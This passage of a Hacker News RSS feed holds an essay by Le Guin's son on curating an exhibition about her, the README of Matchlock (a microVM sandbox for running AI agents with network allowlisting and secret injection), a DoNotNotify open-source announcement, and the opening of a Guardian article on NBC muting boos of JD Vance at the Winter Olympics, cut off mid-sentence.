            <link>https://hyperallergic.com/curating-a-show-on-my-ineffable-mother-ursula-k-le-guin/</link>
            <guid>46932985</guid>
            <pubDate>Sun, 08 Feb 2026 10:13:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://hyperallergic.com/curating-a-show-on-my-ineffable-mother-ursula-k-le-guin/">https://hyperallergic.com/curating-a-show-on-my-ineffable-mother-ursula-k-le-guin/</a>, See on <a href="https://news.ycombinator.com/item?id=46932985">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

    <article>

        <header>

                <a href="https://hyperallergic.com/tag/opinion/">Opinion</a>
            
                <p>I would never have proposed this exhibition in her lifetime. This is, after all, a writer who said in an interview, “Don’t shove me into your damn pigeonhole, where I don’t fit, because I’m all over.”</p>

            <div>
                <p><a href="https://hyperallergic.com/author/theo/">
                                <img src="https://hyperallergic.com/content/images/size/w160/2026/01/theo-leguin.jpeg" alt="Theo Downes-Le Guin">
                            </a>
                </p>
                <div>
                    
                    <p><time datetime="2026-01-13">January 13, 2026</time>
                            <span><span>—</span> 5 min read</span>
                    </p>
                </div>
            </div>

                <figure>
        <img srcset="https://hyperallergic.com/content/images/size/w320/2026/01/0315_ORE_70s_uklwtheo-1.JPG 320w,
                    https://hyperallergic.com/content/images/size/w600/2026/01/0315_ORE_70s_uklwtheo-1.JPG 600w,
                    https://hyperallergic.com/content/images/size/w960/2026/01/0315_ORE_70s_uklwtheo-1.JPG 960w,
                    https://hyperallergic.com/content/images/size/w1200/2026/01/0315_ORE_70s_uklwtheo-1.JPG 1200w,
                    https://hyperallergic.com/content/images/size/w2400/2026/01/0315_ORE_70s_uklwtheo-1.JPG 2000w" sizes="(max-width: 1200px) 100vw, 1120px" src="https://hyperallergic.com/content/images/size/w1200/2026/01/0315_ORE_70s_uklwtheo-1.JPG" alt="Curating a Show on My Ineffable Mother, Ursula K. Le Guin">
            <figcaption><span>Theo Downes-Le Guin with his mother, Ursula K. Le Guin, photographed for the </span><i><em>Oregonian</em></i><span> c. 1968–69 (image courtesy the author)</span></figcaption>
    </figure>

        </header>

        <section>
            <p>PORTLAND — Under an acrylic case in an <a href="https://www.oregoncontemporary.org/a-larger-reality?ref=hyperallergic.com">exhibition</a> I curated about my mother, the writer Ursula K. Le Guin (1929–2018), sits the first typewriter she purchased. Compact and impossibly heavy, the machine comes from an era of word production so distant as to feel alien. The keyboard has no exclamation point. To create the favorite punctuation of tyrants and optimists, one must type an apostrophe, then backspace and type a period.</p><p>The Underwood waited in my parents’ attic for decades as Ursula and the world moved on to electronic typewriters and eventually to computers. I hoped visitors to <em>A Larger Reality</em>, at Oregon Contemporary through February 8, could experience a little of the residual magic that I find clings to it, pecking out whatever they please, taking home the original and leaving a carbon copy for posterity.</p><figure><img src="https://hyperallergic.com/content/images/2026/01/ursula-le-guin-typewriter.jpg" alt="" loading="lazy" width="2000" height="1592" srcset="https://hyperallergic.com/content/images/size/w600/2026/01/ursula-le-guin-typewriter.jpg 600w, https://hyperallergic.com/content/images/size/w1000/2026/01/ursula-le-guin-typewriter.jpg 1000w, https://hyperallergic.com/content/images/size/w1600/2026/01/ursula-le-guin-typewriter.jpg 1600w, https://hyperallergic.com/content/images/2026/01/ursula-le-guin-typewriter.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Ursula K. Le Guin's Underwood typewriter (photo by Mario Gallucci, courtesy Oregon Contemporary)</span></figcaption></figure><p>I’m happiest when the case is removed and the gallery is filled with the sound of metal meeting paper. Visitors who’ve never used a manual typewriter, or who don’t touch type, peck tentatively. Others engage physically, producing the familiar percussive <em>clack-clack</em> sound of my childhood. Either way, I feel I’m sharing not just a machine but a sacred trust with strangers who love <a href="https://www.loa.org/news-and-views/1375-fellow-writers-remember-ursula-k-le-guin-1929-2018/?ref=hyperallergic.com">my mother’s writing and words in general</a>.</p><p>People type poetry, memoir, fiction, epistles, articles, political statements, and fan mail on the Underwood. Some offer short tributes to Ursula or variations on “I can’t believe I’m typing on Ursula K. Le Guin’s typewriter.” Others compose prose or poetry on the spot. A few write nothing, go home to draft several pages, and return later to type something polished.</p><figure><img src="https://hyperallergic.com/content/images/2026/01/ursula-note.jpg" alt="" loading="lazy" width="2000" height="1328" srcset="https://hyperallergic.com/content/images/size/w600/2026/01/ursula-note.jpg 600w, https://hyperallergic.com/content/images/size/w1000/2026/01/ursula-note.jpg 1000w, https://hyperallergic.com/content/images/size/w1600/2026/01/ursula-note.jpg 1600w, https://hyperallergic.com/content/images/2026/01/ursula-note.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption><span>A scan of one of Le Guin's replies to fan mail (image courtesy Ursula K. Le Guin Foundation)</span></figcaption></figure><p>One visitor’s letter wondered how Ursula would feel knowing that her writing and cultural presence are no longer her own after death. The question is apt for me as curator and literary executor. Even a very private writer, while she is alive, exercises a restraining influence on people’s ability to misinterpret her words or life story. I can take comfort in my mother’s respect for the agency and necessity of readers in creating literature. For many years, her stock fan mail reply was a thank-you note, in her handwriting, acknowledging that “a book is just a box of words until a reader opens it.”</p><p>Over the past year, I’ve experienced cycles of grief and joy as I pored over my mother’s letters, manuscripts, and drawings to exhibit. I listened to hours of her voice, recreated an oak tree from her childhood and the room she wrote in from my childhood home. Curating an exhibition about your parent is a strange experience. Many visitors intuit this; the most common question I’m asked about the exhibition is what my mother would think about it.</p><figure><img src="https://hyperallergic.com/content/images/2026/01/OX-A-Larger-Reality-DZ2_3002-web.jpg" alt="" loading="lazy" width="2000" height="1321" srcset="https://hyperallergic.com/content/images/size/w600/2026/01/OX-A-Larger-Reality-DZ2_3002-web.jpg 600w, https://hyperallergic.com/content/images/size/w1000/2026/01/OX-A-Larger-Reality-DZ2_3002-web.jpg 1000w, https://hyperallergic.com/content/images/size/w1600/2026/01/OX-A-Larger-Reality-DZ2_3002-web.jpg 1600w, https://hyperallergic.com/content/images/2026/01/OX-A-Larger-Reality-DZ2_3002-web.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Muralist Ursula Barton's 38-foot-long (~11.6-meter-long) painting of a dragon on the gallery walls (photo by Mario Gallucci, courtesy Oregon Contemporary)</span></figcaption></figure><p>Honestly, I have no idea. I’ve learned not to second-guess my decisions by constantly asking myself, “What would Ursula do?” I would never have proposed this exhibition in her lifetime, for fear that she might see it as reductionist. This is, after all, a writer who said in an <a href="https://www.theparisreview.org/interviews/6253/the-art-of-fiction-no-221-ursula-k-le-guin?ref=hyperallergic.com">interview</a>, “Don’t shove me into your damn pigeonhole, where I don’t fit, because I’m all over. My tentacles are coming out of the pigeonhole in all directions.” Biographical and retrospective exhibitions exist in large part to assert and codify who an artist is. That is, at some level, a type of pigeon-holing.</p><p>This icon-production takes various forms, from hagiography to “objective” centrism to critique. True, if anyone is going to codify my mother, I prefer it to be me. I’m granted an advantage due to proximity and memory. But my version of Ursula is just one version. Even her version of herself was not authoritative. My mother remade herself, through her art, constantly and over decades. She revised everything from her early centering of male characters, to her <a href="https://lareviewofbooks.org/blog/essays/left-hand-darkness-light-metoo/?ref=hyperallergic.com">use of he/him</a> as the default pronoun in an imagined ambisexual world, to <a href="https://www.ursulakleguin.com/blog/95-are-they-going-to-say-this-is-fantasy?ref=hyperallergic.com">her critique</a> of a Kazuo Ishiguro novel. Rather than worship an immutable icon, we should aspire to her willingness to learn and change.</p><figure><img src="https://hyperallergic.com/content/images/2026/01/OX-A-Larger-Reality-DZ2_2927-web.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://hyperallergic.com/content/images/size/w600/2026/01/OX-A-Larger-Reality-DZ2_2927-web.jpg 600w, https://hyperallergic.com/content/images/size/w1000/2026/01/OX-A-Larger-Reality-DZ2_2927-web.jpg 1000w, https://hyperallergic.com/content/images/size/w1600/2026/01/OX-A-Larger-Reality-DZ2_2927-web.jpg 1600w, https://hyperallergic.com/content/images/2026/01/OX-A-Larger-Reality-DZ2_2927-web.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Installation view of </span><i><em>A Larger Reality</em></i><span> at Oregon Contemporary (photo by Mario Gallucci, courtesy Oregon Contemporary)</span></figcaption></figure><p>From a technical, curatorial perspective, however, the mandate of narrative was my greatest hindrance. We’ve had it drummed into us that humans learn through stories, so anyone in an educative role must tell a story. For biographical exhibitions, however, linearity flattens the subject and condescends to the audience. I would go so far as to say this may be true for linearity imposed on any kind of exhibition.</p><p>My mother had something useful to say on this subject. Her essay <a href="http://bookshop.org/a/539/9781838003982?ref=hyperallergic.com"><em>The Carrier Bag Theory of Fiction</em></a><em> </em>(1986)<em>, </em>long a touchstone for writers, has recently become one for curators as well. Ursula posits, to simplify, that the reduction of narrative to linear, techno-heroic stories of conflict and conquest doesn’t serve us well. The hero’s journey remains a default model for storytelling in our culture, including for exhibitions. Ursula argues that the carrier bag, a humble yet capacious tool for gathering, is a better model for storytelling.</p><figure><img src="https://hyperallergic.com/content/images/2026/01/urs.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://hyperallergic.com/content/images/size/w600/2026/01/urs.jpg 600w, https://hyperallergic.com/content/images/size/w1000/2026/01/urs.jpg 1000w, https://hyperallergic.com/content/images/size/w1600/2026/01/urs.jpg 1600w, https://hyperallergic.com/content/images/2026/01/urs.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>The scales on Barton's dragon mural contain snippets of photos, book covers, and other visual ephemera from Le Guin's life. (photo by Mario Gallucci, courtesy Oregon Contemporary)</span></figcaption></figure><p>Exhibitions can be superb carrier bags for culture and knowledge. Few experiences offer so many chances for discursion and recursion, negative space and introspection. A carrier bag can expand to make room for the needs of the moment, for participation, spectacle, and immersion. In a carrier bag, none of these qualities, in balance, is antithetical.</p><p>For my part, releasing myself from the need to tell a tidy story about my mother led to an exhibition that is wordy, baggy, and inconclusive — but also, I believe, engaging and true to the subject.</p>

                  <ul>
                      <li>
                        <a href="https://hyperallergic.com/tag/opinion/">Opinion</a>
                      </li>
                      <li>
                        <a href="https://hyperallergic.com/tag/portland/">Portland</a>
                      </li>
                      <li>
                        <a href="https://hyperallergic.com/tag/ursula-k-le-guin/">Ursula K. Le Guin</a>
                      </li>
                  </ul>

        </section>

      

    </article>
    
        
                

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Matchlock – Secures AI agent workloads with a Linux-based sandbox (134 pts)]]></title>
            <link>https://github.com/jingkaihe/matchlock</link>
            <guid>46932343</guid>
            <pubDate>Sun, 08 Feb 2026 08:07:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/jingkaihe/matchlock">https://github.com/jingkaihe/matchlock</a>, See on <a href="https://news.ycombinator.com/item?id=46932343">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Matchlock</h2><a id="user-content-matchlock" aria-label="Permalink: Matchlock" href="#matchlock"></a></p>
<p dir="auto">Matchlock is a CLI tool for running AI agents in ephemeral microVMs - with network allowlisting, secret injection via MITM proxy, and everything else blocked by default. Your secrets never enter the VM.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why Matchlock?</h2><a id="user-content-why-matchlock" aria-label="Permalink: Why Matchlock?" href="#why-matchlock"></a></p>
<p dir="auto">AI agents need to run code, but giving them unrestricted access to your machine is a risk. Matchlock lets you hand an agent a full Linux environment that boots in under a second - isolated, disposable, and locked down by default.</p>
<p dir="auto">When your agent calls an API the real credentials are injected in-flight by the host. The sandbox only ever sees a placeholder. The network is sealed by default and nothing gets out unless you say so. Even if the agent is tricked into running something malicious your keys don't leak and there's nowhere for data to go. Inside the agent gets a full Linux environment to do whatever it needs. It can install packages and write files and make a mess. Outside your machine doesn't feel a thing. Every sandbox runs on its own copy-on-write filesystem that vanishes when you're done. Same CLI and same behaviour whether you're on a Linux server or a MacBook.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quick Start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick Start" href="#quick-start"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">System Requirements</h3><a id="user-content-system-requirements" aria-label="Permalink: System Requirements" href="#system-requirements"></a></p>
<ul dir="auto">
<li><strong>Linux</strong> with KVM support</li>
<li><strong>macOS</strong> on Apple Silicon</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Install</h3><a id="user-content-install" aria-label="Permalink: Install" href="#install"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="brew tap jingkaihe/essentials
brew install matchlock"><pre>brew tap jingkaihe/essentials
brew install matchlock</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Usage</h3><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="# Basic
matchlock run --image alpine:latest cat /etc/os-release
matchlock run --image alpine:latest -it sh

# Network allowlist
matchlock run --image python:3.12-alpine \
  --allow-host &quot;api.openai.com&quot; python agent.py

# Secret injection (never enters the VM)
export ANTHROPIC_API_KEY=sk-xxx
matchlock run --image python:3.12-alpine \
  --secret ANTHROPIC_API_KEY@api.anthropic.com python call_api.py

# Long-lived sandboxes
matchlock run --image alpine:latest --rm=false   # prints VM ID
matchlock exec vm-abc12345 -it sh                # attach to it

# Lifecycle
matchlock list | kill | rm | prune

# Build from Dockerfile (uses BuildKit-in-VM)
matchlock build -f Dockerfile -t myapp:latest .

# Pre-build rootfs from registry image (caches for faster startup)
matchlock build alpine:latest

# Image management
matchlock image ls                                           # List all images
matchlock image rm myapp:latest                              # Remove a local image
docker save myapp:latest | matchlock image import myapp:latest  # Import from tarball"><pre><span><span>#</span> Basic</span>
matchlock run --image alpine:latest cat /etc/os-release
matchlock run --image alpine:latest -it sh

<span><span>#</span> Network allowlist</span>
matchlock run --image python:3.12-alpine \
  --allow-host <span><span>"</span>api.openai.com<span>"</span></span> python agent.py

<span><span>#</span> Secret injection (never enters the VM)</span>
<span>export</span> ANTHROPIC_API_KEY=sk-xxx
matchlock run --image python:3.12-alpine \
  --secret ANTHROPIC_API_KEY@api.anthropic.com python call_api.py

<span><span>#</span> Long-lived sandboxes</span>
matchlock run --image alpine:latest --rm=false   <span><span>#</span> prints VM ID</span>
matchlock <span>exec</span> vm-abc12345 -it sh                <span><span>#</span> attach to it</span>

<span><span>#</span> Lifecycle</span>
matchlock list <span>|</span> <span>kill</span> <span>|</span> rm <span>|</span> prune

<span><span>#</span> Build from Dockerfile (uses BuildKit-in-VM)</span>
matchlock build -f Dockerfile -t myapp:latest <span>.</span>

<span><span>#</span> Pre-build rootfs from registry image (caches for faster startup)</span>
matchlock build alpine:latest

<span><span>#</span> Image management</span>
matchlock image ls                                           <span><span>#</span> List all images</span>
matchlock image rm myapp:latest                              <span><span>#</span> Remove a local image</span>
docker save myapp:latest <span>|</span> matchlock image import myapp:latest  <span><span>#</span> Import from tarball</span></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">SDK</h2><a id="user-content-sdk" aria-label="Permalink: SDK" href="#sdk"></a></p>
<p dir="auto">Matchlock also ships with Go and Python SDKs for embedding sandboxes directly in your application. Allows you to programmatically launch VMs, exec commands, stream output and write files.</p>
<p dir="auto"><strong>Go</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="package main

import (
	&quot;fmt&quot;
	&quot;os&quot;

	&quot;github.com/jingkaihe/matchlock/pkg/sdk&quot;
)

func main() {
	client, _ := sdk.NewClient(sdk.DefaultConfig())
	defer client.Close()

	sandbox := sdk.New(&quot;alpine:latest&quot;).
		AllowHost(&quot;dl-cdn.alpinelinux.org&quot;, &quot;api.anthropic.com&quot;).
		AddSecret(&quot;ANTHROPIC_API_KEY&quot;, os.Getenv(&quot;ANTHROPIC_API_KEY&quot;), &quot;api.anthropic.com&quot;)

	client.Launch(sandbox)
	client.Exec(&quot;apk add --no-cache curl&quot;)

	// The VM only ever sees a placeholder - the real key never enters the sandbox
	result, _ := client.Exec(&quot;echo $ANTHROPIC_API_KEY&quot;)
	fmt.Print(result.Stdout) // prints &quot;SANDBOX_SECRET_a1b2c3d4...&quot;

	curlCmd := `curl -s --no-buffer https://api.anthropic.com/v1/messages \
  -H &quot;content-type: application/json&quot; \
  -H &quot;x-api-key: $ANTHROPIC_API_KEY&quot; \
  -H &quot;anthropic-version: 2023-06-01&quot; \
  -d '{&quot;model&quot;:&quot;claude-haiku-4-5-20251001&quot;,&quot;max_tokens&quot;:1024,&quot;stream&quot;:true,
       &quot;messages&quot;:[{&quot;role&quot;:&quot;user&quot;,&quot;content&quot;:&quot;Explain TCP to me&quot;}]}'`
	client.ExecStream(curlCmd, os.Stdout, os.Stderr)
}"><pre><span>package</span> main

<span>import</span> (
	<span>"fmt"</span>
	<span>"os"</span>

	<span>"github.com/jingkaihe/matchlock/pkg/sdk"</span>
)

<span>func</span> <span>main</span>() {
	<span>client</span>, <span>_</span> <span>:=</span> <span>sdk</span>.<span>NewClient</span>(<span>sdk</span>.<span>DefaultConfig</span>())
	<span>defer</span> <span>client</span>.<span>Close</span>()

	<span>sandbox</span> <span>:=</span> <span>sdk</span>.<span>New</span>(<span>"alpine:latest"</span>).
		<span>AllowHost</span>(<span>"dl-cdn.alpinelinux.org"</span>, <span>"api.anthropic.com"</span>).
		<span>AddSecret</span>(<span>"ANTHROPIC_API_KEY"</span>, <span>os</span>.<span>Getenv</span>(<span>"ANTHROPIC_API_KEY"</span>), <span>"api.anthropic.com"</span>)

	<span>client</span>.<span>Launch</span>(<span>sandbox</span>)
	<span>client</span>.<span>Exec</span>(<span>"apk add --no-cache curl"</span>)

	<span>// The VM only ever sees a placeholder - the real key never enters the sandbox</span>
	<span>result</span>, <span>_</span> <span>:=</span> <span>client</span>.<span>Exec</span>(<span>"echo $ANTHROPIC_API_KEY"</span>)
	<span>fmt</span>.<span>Print</span>(<span>result</span>.<span>Stdout</span>) <span>// prints "SANDBOX_SECRET_a1b2c3d4..."</span>

	<span>curlCmd</span> <span>:=</span> <span>`curl -s --no-buffer https://api.anthropic.com/v1/messages \</span>
<span>  -H "content-type: application/json" \</span>
<span>  -H "x-api-key: $ANTHROPIC_API_KEY" \</span>
<span>  -H "anthropic-version: 2023-06-01" \</span>
<span>  -d '{"model":"claude-haiku-4-5-20251001","max_tokens":1024,"stream":true,</span>
<span>       "messages":[{"role":"user","content":"Explain TCP to me"}]}'`</span>
	<span>client</span>.<span>ExecStream</span>(<span>curlCmd</span>, <span>os</span>.<span>Stdout</span>, <span>os</span>.<span>Stderr</span>)
}</pre></div>
<p dir="auto"><strong>Python</strong> (<a href="https://pypi.org/project/matchlock/" rel="nofollow">PyPI</a>)</p>
<div dir="auto" data-snippet-clipboard-copy-content="pip install matchlock
# or
uv add matchlock"><pre>pip install matchlock
<span><span>#</span> or</span>
uv add matchlock</pre></div>
<div dir="auto" data-snippet-clipboard-copy-content="import os
import sys

from matchlock import Client, Config, Sandbox

sandbox = (
    Sandbox(&quot;alpine:latest&quot;)
    .allow_host(&quot;dl-cdn.alpinelinux.org&quot;, &quot;api.anthropic.com&quot;)
    .add_secret(
        &quot;ANTHROPIC_API_KEY&quot;, os.environ[&quot;ANTHROPIC_API_KEY&quot;], &quot;api.anthropic.com&quot;
    )
)

curl_cmd = &quot;&quot;&quot;curl -s --no-buffer https://api.anthropic.com/v1/messages \
  -H &quot;content-type: application/json&quot; \
  -H &quot;x-api-key: $ANTHROPIC_API_KEY&quot; \
  -H &quot;anthropic-version: 2023-06-01&quot; \
  -d '{&quot;model&quot;:&quot;claude-haiku-4-5-20251001&quot;,&quot;max_tokens&quot;:1024,&quot;stream&quot;:true,
       &quot;messages&quot;:[{&quot;role&quot;:&quot;user&quot;,&quot;content&quot;:&quot;Explain TCP/IP.&quot;}]}'&quot;&quot;&quot;

with Client(Config()) as client:
    client.launch(sandbox)
    client.exec(&quot;apk add --no-cache curl&quot;)
    client.exec_stream(curl_cmd, stdout=sys.stdout, stderr=sys.stderr)"><pre><span>import</span> <span>os</span>
<span>import</span> <span>sys</span>

<span>from</span> <span>matchlock</span> <span>import</span> <span>Client</span>, <span>Config</span>, <span>Sandbox</span>

<span>sandbox</span> <span>=</span> (
    <span>Sandbox</span>(<span>"alpine:latest"</span>)
    .<span>allow_host</span>(<span>"dl-cdn.alpinelinux.org"</span>, <span>"api.anthropic.com"</span>)
    .<span>add_secret</span>(
        <span>"ANTHROPIC_API_KEY"</span>, <span>os</span>.<span>environ</span>[<span>"ANTHROPIC_API_KEY"</span>], <span>"api.anthropic.com"</span>
    )
)

<span>curl_cmd</span> <span>=</span> <span>"""curl -s --no-buffer https://api.anthropic.com/v1/messages <span>\</span></span>
<span><span></span>  -H "content-type: application/json" <span>\</span></span>
<span><span></span>  -H "x-api-key: $ANTHROPIC_API_KEY" <span>\</span></span>
<span><span></span>  -H "anthropic-version: 2023-06-01" <span>\</span></span>
<span><span></span>  -d '{"model":"claude-haiku-4-5-20251001","max_tokens":1024,"stream":true,</span>
<span>       "messages":[{"role":"user","content":"Explain TCP/IP."}]}'"""</span>

<span>with</span> <span>Client</span>(<span>Config</span>()) <span>as</span> <span>client</span>:
    <span>client</span>.<span>launch</span>(<span>sandbox</span>)
    <span>client</span>.<span>exec</span>(<span>"apk add --no-cache curl"</span>)
    <span>client</span>.<span>exec_stream</span>(<span>curl_cmd</span>, <span>stdout</span><span>=</span><span>sys</span>.<span>stdout</span>, <span>stderr</span><span>=</span><span>sys</span>.<span>stderr</span>)</pre></div>
<p dir="auto">See full examples in <a href="https://github.com/jingkaihe/matchlock/blob/main/examples/go/main.go"><code>examples/go</code></a> and <a href="https://github.com/jingkaihe/matchlock/blob/main/examples/python/main.py"><code>examples/python</code></a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Architecture</h2><a id="user-content-architecture" aria-label="Permalink: Architecture" href="#architecture"></a></p>
<section data-identity="7411e843-c8cb-4028-b1f4-0130f21db874" data-host="https://viewscreen.githubusercontent.com" data-src="https://viewscreen.githubusercontent.com/markdown/mermaid?docs_host=https%3A%2F%2Fdocs.github.com" data-type="mermaid" aria-label="mermaid rendered output container">
  <div dir="auto" data-json="{&quot;data&quot;:&quot;graph LR\n    subgraph Host\n        CLI[\&quot;Matchlock CLI\&quot;]\n        Policy[\&quot;Policy Engine\&quot;]\n        Proxy[\&quot;Transparent Proxy + TLS MITM\&quot;]\n        VFS[\&quot;VFS Server\&quot;]\n\n        CLI --&amp;gt; Policy\n        CLI --&amp;gt; Proxy\n        Policy --&amp;gt; Proxy\n    end\n\n    subgraph VM[\&quot;Micro-VM (Firecracker / Virtualization.framework)\&quot;]\n        Agent[\&quot;Guest Agent\&quot;]\n        FUSE[\&quot;/workspace (FUSE)\&quot;]\n        Image[\&quot;Any OCI Image (Alpine, Ubuntu, etc.)\&quot;]\n\n        Agent --- Image\n        FUSE --- Image\n    end\n\n    Proxy -- \&quot;vsock :5000\&quot; --&amp;gt; Agent\n    VFS -- \&quot;vsock :5001\&quot; --&amp;gt; FUSE\n&quot;}" data-plain="graph LR
    subgraph Host
        CLI[&quot;Matchlock CLI&quot;]
        Policy[&quot;Policy Engine&quot;]
        Proxy[&quot;Transparent Proxy + TLS MITM&quot;]
        VFS[&quot;VFS Server&quot;]

        CLI --> Policy
        CLI --> Proxy
        Policy --> Proxy
    end

    subgraph VM[&quot;Micro-VM (Firecracker / Virtualization.framework)&quot;]
        Agent[&quot;Guest Agent&quot;]
        FUSE[&quot;/workspace (FUSE)&quot;]
        Image[&quot;Any OCI Image (Alpine, Ubuntu, etc.)&quot;]

        Agent --- Image
        FUSE --- Image
    end

    Proxy -- &quot;vsock :5000&quot; --> Agent
    VFS -- &quot;vsock :5001&quot; --> FUSE
">
      <pre lang="mermaid" aria-label="Raw mermaid code">graph LR
    subgraph Host
        CLI["Matchlock CLI"]
        Policy["Policy Engine"]
        Proxy["Transparent Proxy + TLS MITM"]
        VFS["VFS Server"]

        CLI --&gt; Policy
        CLI --&gt; Proxy
        Policy --&gt; Proxy
    end

    subgraph VM["Micro-VM (Firecracker / Virtualization.framework)"]
        Agent["Guest Agent"]
        FUSE["/workspace (FUSE)"]
        Image["Any OCI Image (Alpine, Ubuntu, etc.)"]

        Agent --- Image
        FUSE --- Image
    end

    Proxy -- "vsock :5000" --&gt; Agent
    VFS -- "vsock :5001" --&gt; FUSE
</pre>
    </div>
  <span role="presentation">
    <span data-view-component="true">
      <span>Loading</span>
</span>
  </span>
</section>

<p dir="auto"><h3 tabindex="-1" dir="auto">Network Modes</h3><a id="user-content-network-modes" aria-label="Permalink: Network Modes" href="#network-modes"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Platform</th>
<th>Mode</th>
<th>Mechanism</th>
</tr>
</thead>
<tbody>
<tr>
<td>Linux</td>
<td>Transparent proxy</td>
<td>nftables DNAT on ports 80/443</td>
</tr>
<tr>
<td>macOS</td>
<td>NAT (default)</td>
<td>Virtualization.framework built-in NAT</td>
</tr>
<tr>
<td>macOS</td>
<td>Interception (with <code>--allow-host</code>/<code>--secret</code>)</td>
<td>gVisor userspace TCP/IP at L4</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h2 tabindex="-1" dir="auto">Docs</h2><a id="user-content-docs" aria-label="Permalink: Docs" href="#docs"></a></p>
<p dir="auto">See <a href="https://github.com/jingkaihe/matchlock/blob/main/AGENTS.md">AGENTS.md</a> for the full developer reference.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">MIT</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[DoNotNotify is now Open Source (363 pts)]]></title>
            <link>https://donotnotify.com/opensource.html</link>
            <guid>46932192</guid>
            <pubDate>Sun, 08 Feb 2026 07:39:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://donotnotify.com/opensource.html">https://donotnotify.com/opensource.html</a>, See on <a href="https://news.ycombinator.com/item?id=46932192">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <header>
      
    </header>

    <section>
      <h2>DoNotNotify is Now Open Source</h2>
      <p>
        We're excited to announce that DoNotNotify has been open sourced. The full source code for the app
        is now publicly available for anyone to view, study, and contribute to.
      </p>
      <p>
        You can find the source code on GitHub:
      </p>
      <p>
        <a href="https://github.com/anujja/DoNotNotify" target="_blank">github.com/anujja/DoNotNotify</a>
      </p>
    </section>

    <section>
      <h2>Why Open Source?</h2>
      <p>
        DoNotNotify was built with a strong commitment to privacy. By open sourcing the app, we're backing
        that commitment with full transparency. You no longer have to take our word for it — you can verify
        for yourself that the app does exactly what it says and nothing more.
      </p>
    </section>

    <section>
      <h2>Get Involved</h2>
      <p>
        We welcome contributions from the community. Whether it's reporting bugs, suggesting features,
        or submitting pull requests, your involvement helps make DoNotNotify better for everyone.
      </p>
      <ul>
        <li><a href="https://github.com/anujja/DoNotNotify/issues" target="_blank">Report a bug or request a feature</a>
        </li>
        <li><a href="https://github.com/anujja/DoNotNotify" target="_blank">Browse the source code</a></li>
      </ul>
    </section>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The world heard JD Vance being booed at the Olympics. Except for viewers in USA (241 pts)]]></title>
            <link>https://www.theguardian.com/sport/2026/feb/07/jd-vance-boos-winter-olympics</link>
            <guid>46931948</guid>
            <pubDate>Sun, 08 Feb 2026 07:00:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/sport/2026/feb/07/jd-vance-boos-winter-olympics">https://www.theguardian.com/sport/2026/feb/07/jd-vance-boos-winter-olympics</a>, See on <a href="https://news.ycombinator.com/item?id=46931948">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>The modern Olympics sell themselves on a simple premise: the whole world, watching the same moment, at the same time. On Friday night in Milan, that illusion fractured in real time.</p><p>When Team USA entered the San Siro during the parade of nations, the speed skater Erin Jackson led the delegation into a wall of cheers. Moments later, when cameras cut to US vice-president JD Vance and second lady Usha Vance, large sections of the crowd responded with boos. Not subtle ones, but audible and sustained ones. <a href="https://x.com/donkoclock/status/2019887497891696788" data-link-name="in body link">Canadian viewers heard them</a>. Journalists seated in the press tribunes in the upper deck, <a href="https://www.theguardian.com/sport/2026/feb/06/intimate-and-enormous-milano-cortina-opening-ceremony-winter-olympics-2026" data-link-name="in body link">myself included</a>, clearly <a href="https://x.com/cbrennansports/status/2019884436121125181" data-link-name="in body link">heard them</a>. But as I quickly realized from a groupchat with friends back home, American viewers <a href="https://www.youtube.com/watch?v=H7Um9gPUoA0" data-link-name="in body link">watching NBC did not</a>.</p><figure id="60a9b2dc-fbb1-42da-a579-ddbed3a0a525" data-spacefinder-role="richLink" data-spacefinder-type="model.dotcomrendering.pageElements.RichLinkBlockElement"><gu-island name="RichLinkComponent" priority="feature" deferuntil="idle" props="{&quot;richLinkIndex&quot;:2,&quot;element&quot;:{&quot;_type&quot;:&quot;model.dotcomrendering.pageElements.RichLinkBlockElement&quot;,&quot;prefix&quot;:&quot;Related: &quot;,&quot;text&quot;:&quot;NBC appears to cut crowd’s booing of JD Vance from Winter Olympics broadcast&quot;,&quot;elementId&quot;:&quot;60a9b2dc-fbb1-42da-a579-ddbed3a0a525&quot;,&quot;role&quot;:&quot;richLink&quot;,&quot;url&quot;:&quot;https://www.theguardian.com/us-news/2026/feb/06/nbc-appears-to-cut-crowds-booing-of-jd-vance-from-winter-olympics-broadcast&quot;},&quot;ajaxUrl&quot;:&quot;https://api.nextgen.guardianapps.co.uk&quot;,&quot;format&quot;:{&quot;design&quot;:8,&quot;display&quot;:0,&quot;theme&quot;:2}}"></gu-island></figure><p>On its own, the situation might once have passed unnoticed. But the defining feature of the modern sports media landscape is that no single broadcaster controls the moment any more. CBC carried it. The BBC 